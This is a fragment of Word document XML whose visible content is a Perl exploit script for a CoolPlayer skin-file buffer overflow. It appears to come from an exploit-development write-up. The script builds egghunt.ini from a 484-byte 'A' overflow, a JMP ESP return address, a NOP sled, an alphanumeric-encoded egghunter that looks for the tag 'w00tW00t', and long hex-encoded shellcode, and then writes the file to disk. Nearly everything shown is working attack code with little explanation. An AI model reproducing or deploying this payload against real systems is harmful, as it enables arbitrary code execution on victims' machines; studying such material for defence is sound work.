                          </w:p>
                          <w:p w14:paraId="05E72CA7" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4b\x43\x4e\x49\x48\x4b\x52\x52\x53\x4d\x57\x45\x4c\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="10A8B360" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x34\x56\x32\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="32F61FE6" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x39\x51\x55\x54\x48\x52\x48\x52\x4c\x52\x4c\x51\x30\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="273292F9" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x31\x45\x38\x56\x53\x47\x42\x56\x4e\x45\x34\x45\x38\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5A3D1AD2" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x35\x43\x43\x43\x55\x43\x42\x4c\x48\x51\x4c\x56\x44\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="753AC540" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4a\x4c\x49\x4d\x36\x51\x46\x4b\x4f\x56\x35\x43\x34\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6AAE15B8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x39\x49\x52\x56\x30\x4f\x4b\x49\x38\x4e\x42\x50\x4d\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33841C38" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4c\x4c\x47\x45\x4c\x56\x44\x50\x52\x5a\x48\x45\x31\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6E3B6B28" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4f\x4b\x4f\x4b\x4f\x52\x48\x52\x4f\x54\x38\x51\x48\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="788ABD10" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x50\x43\x58\x43\x51\x52\x47\x52\x45\x50\x42\x43\x58\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7D83FF6D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4d\x45\x35\x54\x33\x54\x33\x56\x51\x49\x4b\x4d\x58\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4BEAF919" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4c\x51\x34\x54\x4a\x4c\x49\x4d\x33\x52\x48\x56\x4e\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="106321B5" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x58\x51\x30\x51\x30\x45\x38\x52\x4c\x52\x4f\x43\x51\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4610C644" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x44\x52\x48\x47\x50\x52\x50\x45\x31\x52\x59\x43\x58\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0C92EA4F" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x35\x43\x52\x52\x4f\x43\x48\x45\x38\x43\x43\x52\x53\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7B3396BD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x51\x45\x37\x43\x58\x43\x51\x47\x50\x52\x4d\x43\x55\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="052AB9CA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x58\x51\x30\x52\x49\x54\x33\x51\x30\x45\x38\x51\x44\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="532627DD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x48\x43\x59\x43\x43\x50\x31\x49\x59\x4b\x38\x50\x4c\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="79D42CF0" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x54\x45\x4d\x4d\x59\x4d\x31\x50\x31\x4e\x32\x51\x42\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33A2615E" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x53\x56\x31\x51\x42\x4b\x4f\x4e\x30\x56\x51\x49\x50\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5E3AF0C0" w14:textId="18E21092" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x50\x4b\x4f\x51\x45\x54\x48\x41\x41";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1632D5A9" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="373B7B0E" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>open($FILE,"&gt;$file1");</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7FEC8693" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="491687DE" w14:textId="2FF3A1FA" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>close($FILE);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BDB0C" id="_x0000_s1046" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:-45.8pt;margin-top:17.75pt;width:375.75pt;height:627.7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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="57583F0A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$file1 = "egghunt.ini"; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6F7750DA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t xml:space="preserve">="; </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4F659C74" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#OVERFLOW</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="082FDF4B" w14:textId="165DB3C9" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= pack('V', 0x7C86467B);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00E72F21">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#JMP ESP</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2F95E8DC" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x90" x 20;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#NOP SLED</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="251304A2" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1468B5B7" w14:textId="77777777" w:rsidR="00CF75AD" w:rsidRPr="00CF75AD" w:rsidRDefault="00CF75AD" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="19C518D1" w14:textId="23C6E09E" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x89\xe0\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>xda</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t xml:space="preserve">\xc0\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43" . </w:t>
                      </w:r>
                      <w:r w:rsidR="00E72F21">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidR="00E72F21">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00E72F21" w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#EGGHUNTER ENCODED ALPHA UPPER</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3955BB3B" w14:textId="1FA3C286" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t xml:space="preserve">"\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30" .    </w:t>
                      </w:r>
                      <w:r w:rsidR="00E72F21">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00E72F21" w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#LOOKS FOR w00tW00t</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="28FC8DD8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7BDA4EEA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="011250BC" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x43\x56\x4d\x51\x49\x5a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x43\x5a\x44" .</w:t>
                      </w:r>
                    </w:p>
